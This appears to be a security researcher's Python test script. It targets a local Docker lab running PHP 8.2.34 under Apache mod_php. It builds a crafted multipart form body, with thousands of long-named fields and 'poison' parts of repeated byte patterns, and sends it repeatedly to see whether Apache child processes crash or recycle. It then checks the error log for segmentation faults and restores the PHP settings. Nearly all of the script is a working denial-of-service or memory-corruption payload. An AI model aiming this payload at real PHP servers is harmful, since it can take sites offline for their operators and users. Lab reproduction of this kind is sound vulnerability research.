#!/usr/bin/env python3
"""oom50: mod_php pivot (stdlib urllib only) — does a PERSISTENT php_vuln
(apache prefork, 8.2.34) die on the attack shape CGI survives?
"""
import re
import subprocess
import sys
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
CONF = "/usr/local/etc/php/conf.d/30-oomlab.ini"
NAMELEN = 3064


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * 10237 + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def sh(cmd):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=60)
    return r.stdout.decode("latin1")


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:120]
    except Exception as e:
        return type(e).__name__, str(e)[:120]


def children():
    out = sh("ps -o pid,ppid,rss,comm -C apache2 2>/dev/null | tail -n +2")
    return sorted(re.findall(r"^\s*(\d+)\s+1\s", out, re.M))


def set_ini(limit, vars_):
    sh("printf 'memory_limit=%s\\nmax_input_vars=%s\\n' %s %s > %s"
       % (limit, vars_, limit, vars_, CONF))
    sh("apachectl -k graceful")
    time.sleep(1.2)


def main():
    n_fire = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    set_ini("20600000", "100000")
    try:
        print("[ini]", http("/oom_sapi.php", timeout=10))
        tiny = (b"--BOUND\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n"
                b"--BOUND--\r\n")
        print("[tiny]", http("/oom_mod.php", tiny,
                             "multipart/form-data; boundary=BOUND", 15))
        before = children()
        print("[kids]", before)
        att = build_attack()
        print("[fire] attack %d bytes x%d" % (len(att), n_fire), flush=True)
        for i in range(n_fire):
            t0 = time.time()
            code, text = http("/oom_mod.php", att,
                              "multipart/form-data; boundary=BOUND", 30)
            print("  fire%d: %s %.1fs body=%r" % (i, code, time.time() - t0, text[:60]),
                  flush=True)
            time.sleep(0.5)
        time.sleep(2)
        after = children()
        new = [p for p in after if p not in before]
        gone = [p for p in before if p not in after]
        print("[kids-after]", after)
        print("[kids-new]", new, "[kids-gone]", gone)
        log = sh("tail -12 /var/log/apache2/error.log")
        print("[errlog]")
        print(log)
        seg = "Segmentation fault" in log or "signal Segmentation" in log
        print("[VERDICT] child_recycle=%s segv_in_log=%s" % (bool(new), seg))
        print("[alive]", http("/oom_sapi.php", timeout=10))
    finally:
        set_ini("128M", "1000")
        print("[restored]", http("/oom_sapi.php", timeout=10))


if __name__ == "__main__":
    main()
